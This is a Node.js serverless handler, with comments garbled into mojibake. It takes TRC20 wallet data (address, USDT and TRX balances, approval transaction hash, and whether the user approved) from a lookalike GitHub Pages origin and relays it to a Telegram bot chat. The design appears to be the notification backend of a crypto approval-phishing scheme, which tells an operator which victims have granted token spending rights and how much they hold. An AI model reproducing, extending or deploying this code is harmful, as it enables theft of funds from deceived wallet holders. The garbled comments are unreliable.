// å¼•å…¥httpsæ¨¡å—ï¼ˆä¿®å¤åŸä»£ç ä¸­TELEGRAM_API_URLçš„è¯­æ³•é”™è¯¯ï¼‰
const https = require('https');

module.exports = async function handler(req, res) {
  // 1. åŸæœ‰CORSé…ç½®ä¸å˜
  const allowedOrigin = "https://trc20trx-alt.github.io";
  res.setHeader("Access-Control-Allow-Origin", allowedOrigin);
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  // 2. åŸæœ‰OPTIONSé¢„è¯·æ±‚å¤„ç†ä¸å˜
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  // 3. åŸæœ‰è¯·æ±‚æ–¹æ³•æ ¡éªŒä¸å˜
  if (req.method !== "POST") {
    return res.status(405).json({ error: "åªæ”¯æŒPOSTè¯·æ±‚" });
  }

  // ========== æ ¸å¿ƒä¿®æ”¹1ï¼šæ–°å¢â€œæˆæƒçŠ¶æ€â€å­—æ®µï¼ˆisApprovedï¼Œå¸ƒå°”å€¼æ˜“è§£æï¼‰ ==========
  // æ¥æ”¶6ä¸ªå­—æ®µï¼šåŸæœ‰5ä¸ª + isApprovedï¼ˆæˆæƒçŠ¶æ€ï¼‰
  const { address, tokenBalance, trxBalance, approveTime, txHash, isApproved = false } = req.body;
  
  // åŸæœ‰å¿…å¡«å­—æ®µæ ¡éªŒä¸å˜ï¼ˆä¸å½±å“ç°æœ‰åŠŸèƒ½ï¼‰
  if (!address || !tokenBalance) {
    return res.status(400).json({ error: "ç¼ºå°‘å…³é”®æˆæƒæ•°æ®ï¼ˆaddress/tokenBalanceï¼‰" });
  }

  // 4. åŸæœ‰Telegramé…ç½®ä¸å˜
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.status(500).json({ error: "åç«¯æœªé…ç½®Telegramç¯å¢ƒå˜é‡" });
  }

  // ä¿®å¤åŸä»£ç ä¸­TELEGRAM_API_URLçš„è¯­æ³•é”™è¯¯ï¼ˆæ¨¡æ¿å­—ç¬¦ä¸²+httpsæ¨¡å—ï¼‰
  const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    // ========== æ ¸å¿ƒä¿®æ”¹2ï¼šTelegramæ¶ˆæ¯ä¸­æ˜¾ç¤ºæˆæƒçŠ¶æ€ ==========
    const message = `
ğŸ”” TRC20æˆæƒé€šçŸ¥ï¼
ğŸ“Œ æˆæƒåœ°å€ï¼š${address}
ğŸ’µ USDTä½™é¢ï¼š${tokenBalance || "æœªè·å–"} USDT
ğŸª™ TRXä½™é¢ï¼š${trxBalance || "æœªè·å–"} TRX
â° æˆæƒæ—¶é—´ï¼š${approveTime || new Date().toLocaleString()}
ğŸ”— äº¤æ˜“å“ˆå¸Œï¼š${txHash ? `<a href="https://tronscan.org/#/transaction/${txHash}">${txHash}</a>` : "æœªç”Ÿæˆ/æˆæƒå¤±è´¥"}
âœ… æˆæƒç»“æœï¼š${isApproved ? "æˆæƒæˆåŠŸ" : "æˆæƒå¤±è´¥/ç”¨æˆ·å–æ¶ˆ"}
    `;

    // 5. åŸæœ‰Telegram APIè°ƒç”¨ä¸å˜
    // ä½¿ç”¨httpsæ¨¡å—å‘é€è¯·æ±‚ï¼ˆä¿®å¤åŸä»£ç ä¸­fetchå¯èƒ½çš„ç¯å¢ƒé—®é¢˜ï¼‰
    const response = await new Promise((resolve, reject) => {
      const request = https.request(TELEGRAM_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" }
      }, (res) => {
        let data = "";
        res.on("data", (chunk) => data += chunk);
        res.on("end", () => resolve(JSON.parse(data)));
      });
      request.on("error", (err) => reject(err));
      // å‘é€åŒ…å«æˆæƒçŠ¶æ€çš„æ•°æ®
      request.write(JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: false
      }));
      request.end();
    });

    if (!response.ok) throw new Error(`Telegram APIå“åº”å¼‚å¸¸ï¼š${response.description || "æœªçŸ¥é”™è¯¯"}`);
    res.status(200).json({ success: true, message: "Telegramé€šçŸ¥å·²å‘é€ï¼ˆå«æˆæƒçŠ¶æ€ï¼‰" });
  } catch (error) {
    console.error("é€šçŸ¥å¤±è´¥ï¼š", error);
    res.status(500).json({ error: "é€šçŸ¥å‘é€å¤±è´¥", detail: error.message });
  }
}
